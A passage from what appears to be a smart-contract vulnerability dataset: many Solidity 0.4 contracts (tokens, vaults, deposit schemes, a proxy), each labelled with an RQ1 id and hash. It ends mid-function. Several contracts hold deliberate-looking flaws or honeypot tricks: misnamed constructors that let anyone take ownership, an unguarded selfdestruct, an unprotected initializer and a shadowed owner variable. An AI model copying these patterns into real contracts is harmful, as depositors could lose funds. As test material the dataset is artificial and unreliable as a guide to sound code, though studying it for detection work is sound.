    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}

```

## RQ1_e440a75a1c8a

文件 `units/program.sol`；SHA256 `8c8bea8a68c2abe1aabb669afd84248ebab9e2deb995f12443575ba0440c051b`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract BasicToken is ERC20Basic, Ownable {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  mapping(address => bool) public allowedAddresses;
  mapping(address => bool) public lockedAddresses;
  bool public locked = true;
  function allowAddress(address _addr, bool _allowed) public onlyOwner {
    require(_addr != owner);
    allowedAddresses[_addr] = _allowed;
  }
  function lockAddress(address _addr, bool _locked) public onlyOwner {
    require(_addr != owner);
    lockedAddresses[_addr] = _locked;
  }
  function setLocked(bool _locked) public onlyOwner {
    locked = _locked;
  }
  function canTransfer(address _addr) public constant returns (bool) {
    if(locked){
      if(!allowedAddresses[_addr]&&_addr!=owner) return false;
    }else if(lockedAddresses[_addr]) return false;
    return true;
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(canTransfer(msg.sender));
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract StandardToken is ERC20, BasicToken {
  mapping (address => mapping (address => uint256)) allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(canTransfer(msg.sender));
    uint256 _allowance = allowed[_from][msg.sender];
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = _allowance.sub(_value);
    Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
  function increaseApproval (address _spender, uint _addedValue)
    returns (bool success) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval (address _spender, uint _subtractedValue)
    returns (bool success) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract BurnableToken is StandardToken {
    event Burn(address indexed burner, uint256 value);
    function burn(uint256 _value) public {
        require(_value > 0);
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        Burn(burner, _value);
        Transfer(burner, address(0), _value);
    }
}
contract CANNAX is BurnableToken {
    string public constant name = "Canna Orient";
    string public constant symbol = "CANNAX";
    uint public constant decimals = 18;
    uint256 public constant initialSupply = 1000000000 * (10 ** uint256(decimals));
    function VTTR () {
        totalSupply = initialSupply;
        balances[msg.sender] = initialSupply; 
        allowedAddresses[owner] = true;
    }
}
```

## RQ1_254bfee03840

文件 `units/program.sol`；SHA256 `fd9385ebc1ae59d0a4e2ec006d6991b960d7820ed2457f4395295e2e09f924f1`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract Bitexlive is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    function bitexlive() public {
        symbol = "0BTEX";
        name = "0 Bitexlive Token";
        decimals = 18;
        _totalSupply = 81000000000000000000000000;
        balances[0x6DD2c4896cF8e1E574Cff891D6cbf076bD86c8d4] = _totalSupply;
        Transfer(address(0), 0x6DD2c4896cF8e1E574Cff891D6cbf076bD86c8d4, _totalSupply);
    }
    function totalSupply() public constant returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(msg.sender, to, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        return true;
    }
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(from, to, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }
    function () public payable {
        revert();
    }
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}
```

## RQ1_4c2921d39474

文件 `units/program.sol`；SHA256 `bf832b5a670b5a3f42bfdb615ba75db003e65cbfc8d2fc79ac1275a09b3ed9c4`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.17;
contract Owned 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    function isOwner()
    internal
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
}
contract EthDeposit is Owned
{
    address public Manager;
    address public NewManager;
    uint public SponsorsQty;
    uint public CharterCapital;
    uint public ClientQty;
    uint public PrcntRate = 5;
    bool paymentsAllowed;
    struct Lender
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    mapping (address => uint) public Sponsors;
    mapping (address => Lender) public Lenders;
    event StartOfPayments(address indexed calledFrom, uint time);
    event EndOfPayments(address indexed calledFrom, uint time);
    function init(address _manager)
    public
    {
        owner = msg.sender;
        Manager = _manager;
    }
    function isManager()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager);
    }
    function canManage()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager||msg.sender==owner);
    }
    function ChangeManager(address _newManager)
    public
    {
        if(canManage())
        { 
            NewManager = _newManager;
        }
    }
    function ConfirmManager()
    public
    {
        if(msg.sender==NewManager)
        {
            Manager=NewManager;
        }
    }
    function StartPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(true);
            StartOfPayments(msg.sender, now);
        }
    }
    function StopPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
    }address owner;
    function AuthorizePayments(bool val)
    public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    function SetPrcntRate(uint val)
    public
    {
        if(canManage())
        {
            if(val!=PrcntRate)
            {
                if(val>=1)
                {
                    PrcntRate = val;  
                }
            }
        }
    }
    function()
    public
    payable
    {
        ToSponsor();
    }
    function ToSponsor() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    function WithdrawToSponsor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(CharterCapital>=_wei)CharterCapital-=_wei;
                   else CharterCapital=0;
                 }
            }
        }
    }
    function Deposit() 
    public 
    payable
    {
        FixProfit();
        Lenders[msg.sender].Amount += msg.value;
    }
    function CheckProfit(address addr) 
    public 
    constant 
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    function FixProfit()
    public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=now;
    }
    function WitdrawLenderProfit() 
    public 
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);
        }
    }
}
```

## RQ1_03a271e0c36c

文件 `units/program.sol`；SHA256 `19bbf64e4f77a17187e0fb961bb3e1ca2f988219818a33615f7246672fc7d7ac`；位置按UTF-8字节。

```solidity
pragma solidity 0.4.24;
contract Delegatable {
    address public empty1; 
    address public empty2; 
    address public empty3;  
    address public owner;  
    address public delegation; 
    event DelegationTransferred(address indexed previousDelegate, address indexed newDelegation);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner, "Sender is not the owner");
        _;
    }
    constructor() public {}
    function transferDelegation(address _newDelegation) public onlyOwner {
        require(_newDelegation != address(0), "Trying to transfer to address 0");
        emit DelegationTransferred(delegation, _newDelegation);
        delegation = _newDelegation;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Trying to transfer to address 0");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}
contract DelegateProxy {
    constructor() public {}
    function delegatedFwd(address _dst, bytes _calldata) internal {
        assembly {
            let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0)
            let size := returndatasize
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch result case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}
contract Proxy is Delegatable, DelegateProxy {
    constructor() public {}
    function () public {
        require(delegation != address(0), "Delegation is address 0, not initialized");
        delegatedFwd(delegation, msg.data);
    }
    function initialize(address _controller, uint256) public {
        require(owner == 0, "Already initialized");
        owner = msg.sender;
        delegation = _controller;
        delegatedFwd(_controller, msg.data);
    }
}
```

## RQ1_a533300b98f5

文件 `units/program.sol`；SHA256 `2d82af742c5fc5d0fdb4e5feab69e5253b4aa092060628c94bd58d89ba18dac3`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract Nobody {
    function die() public {
        selfdestruct(msg.sender);
    }
}

```

## RQ1_b45fd17eae9d

文件 `units/program.sol`；SHA256 `8c8779c83ac3be32ccdc1f238cb54c537bf59b17d63e074abc2a40f21b0f9317`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.17;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
contract Vault is TokenVault {
    string public constant version = "v1.1";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_63bf9791ac38

文件 `units/program.sol`；SHA256 `c08a14189bb7d1b6273242e33196575df4d38422d6ac815cf71470fb9247b04d`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract Dividend {
    struct Record {
        uint balance;
        uint shares;
        uint index;
    }
    mapping (address => Record) public records;
    address[] public investors;
    address public funder;
    uint public startTime;
    uint public totalShares;
    uint public lastInvestmentTime;
    event Invested(uint indexed timestamp, address indexed from, uint amount, uint shares);
    event Withdrawn(uint indexed timestamp, address indexed from, uint amount);
    function Dividend() public payable {
        records[msg.sender] = Record(msg.value,
            totalShares = allocateShares(msg.value, 0),
            investors.push(funder = msg.sender));
        Invested(startTime = lastInvestmentTime = now, msg.sender, msg.value, totalShares);
    }
    function () public payable {
        if (msg.value > 0) {
            invest();
        } else {
            withdraw();
        }
    }
    function investorCount() public view returns (uint) {
      return investors.length;
    }
    function invest() public payable returns (uint) {
        uint value = msg.value;
        uint shares = allocateShares(value, (now - startTime) / 1 hours);
        if (shares > 0) {
            for (uint i = investors.length; i > 0; i--) {
                Record storage rec = records[investors[i - 1]];
                rec.balance += value * rec.shares / totalShares;
            }
            address investor = msg.sender;
            rec = records[investor];
            if (rec.index > 0) {
                rec.shares += shares;
            } else {
                rec.shares = shares;
                rec.index = investors.push(investor);
            }
            totalShares += shares;
            Invested(lastInvestmentTime = now, investor, value, shares);
        }
        return shares;
    }
    function withdraw() public returns (uint) {
        Record storage rec = records[msg.sender];
        uint balance = rec.balance;
        if (balance > 0) {
            rec.balance = 0;
            msg.sender.transfer(balance);
            Withdrawn(now, msg.sender, balance);
        }
        if (now - lastInvestmentTime > 4 weeks) {
            selfdestruct(funder);
        }
        return balance;
    }
    function allocateShares(uint weis, uint bonus) public pure returns (uint) {
        return weis * (1000 + bonus) / 1 ether;
    }
}
```

## RQ1_c9b9d9ecb7bb

文件 `units/program.sol`；SHA256 `ab8ba9fd046eedc5deb33d07c57578cd8d36798322b64244350712291a0dde38`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.17;
contract Owned 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    function isOwner()
    internal
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
}
contract EthMultiplicator is Owned
{
    address public Manager;
    address public NewManager;
    address public owner;
    uint public SponsorsQty;
    uint public CharterCapital;
    uint public ClientQty;
    uint public PrcntRate = 5;
    bool paymentsAllowed;
    struct Lender
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    mapping (address => uint) public Sponsors;
    mapping (address => Lender) public Lenders;
    event StartOfPayments(address indexed calledFrom, uint time);
    event EndOfPayments(address indexed calledFrom, uint time);
    function initEthMultiplicator(address _manager)
    public
    {
        owner = msg.sender;
        Manager = _manager;
    }
    function isManager()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager);
    }
    function canManage()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager||msg.sender==owner);
    }
    function ChangeManager(address _newManager)
    public
    {
        if(canManage())
        { 
            NewManager = _newManager;
        }
    }
    function ConfirmManager()
    public
    {
        if(msg.sender==NewManager)
        {
            Manager=NewManager;
        }
    }
    function StartPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(true);
            StartOfPayments(msg.sender, now);
        }
    }
    function StopPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
    }
    function AuthorizePayments(bool val)
    public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    function SetPrcntRate(uint val)
    public
    {
        if(canManage())
        {
            if(val!=PrcntRate)
            {
                if(val>=1)
                {
                    PrcntRate = val;  
                }
            }
        }
    }
    function()
    public
    payable
    {
        ToSponsor();
    }
    function ToSponsor() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    function WithdrawToSponsor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(CharterCapital>=_wei)CharterCapital-=_wei;
                   else CharterCapital=0;
                 }
            }
        }
    }
    function Deposit() 
    public 
    payable
    {
        FixProfit();
        Lenders[msg.sender].Amount += msg.value;
    }
    function CheckProfit(address addr) 
    public 
    constant 
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    function FixProfit()
    public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=now;
    }
    function WitdrawLenderProfit() 
    public 
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);
        }
    }
}
```

## RQ1_9c985fb01894

文件 `units/program.sol`；SHA256 `b9faf9203c5a18275b1fe1a43856b1c1c62131bf4ded84a571e5b387fb9979ef`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
contract EthVault is TokenVault {
    string public constant version = "v1.2";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_a47200b36eb7

文件 `units/program.sol`；SHA256 `ece92d2dc325316cf96a2268e3e87b19e3399087042a2978fd8785c8662c25e0`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract ForeignToken {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint256 amount) public;
}
contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}
contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;
    event Deposit(uint amount);
    event Withdraw(uint amount);
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    function() payable {
        deposit();
    }
    function deposit() payable {
        if (msg.value >= 0.1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }
    function kill() payable {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.send(amount);
            Withdraw(amount);
        }
    }
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}

```

## RQ1_81d27b74b2b8

文件 `units/program.sol`；SHA256 `8261fbc6eae685161fb1ec07d57987c1d8dbea04f53ccae5dff446ed29f22af6`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); 
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;
    return c;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ItemBase is Ownable {
    using SafeMath for uint;
    struct Item {
        string name;
        string itemType;
        string size;
        string color;
        uint128 price;
    }
    uint128 MAX_ITEMS = 1;
    Item[] items;
    mapping(uint => address) public itemIndexToOwner;
    mapping (address => uint) public ownershipTokenCount;
    mapping (uint => address) public itemIndexToApproved;
    function getItem( uint _itemId ) public view returns(string name, string itemType, string size, string color, uint128 price) {
        Item memory _item = items[_itemId];
        name = _item.name;
        itemType = _item.itemType;
        size = _item.size;
        color = _item.color;
        price = _item.price;
    }
}
contract ERC721 {
    function totalSupply() public view returns (uint256);
    function balanceOf(address _owner) external view returns (uint256);
    function ownerOf(uint256 _tokenId) external view returns (address);
    function approve(address _approved, uint256 _tokenId) external;
    function transfer(address _to, uint256 _tokenId) external;
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);
    event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);
}
contract SatoshiZero is ItemBase, ERC721 {
    string public constant name = "Satoshis Closet";
    string public constant symbol = "STCL";
    string public constant tokenName = "Tom's Shirt / The Proof of Concept";
    event Purchase(address owner, uint itemId);
    function _owns(address _claimant, uint _tokenId) internal view returns (bool) {
        return itemIndexToOwner[_tokenId] == _claimant;
    }
    function _approvedFor(address _claimant, uint _tokenId) internal view returns (bool) {
        return itemIndexToApproved[_tokenId] == _claimant;
    }
    function _approve(uint _tokenId, address _approved) internal {
        itemIndexToApproved[_tokenId] = _approved;
    }
    function balanceOf(address _owner) external view returns (uint) {
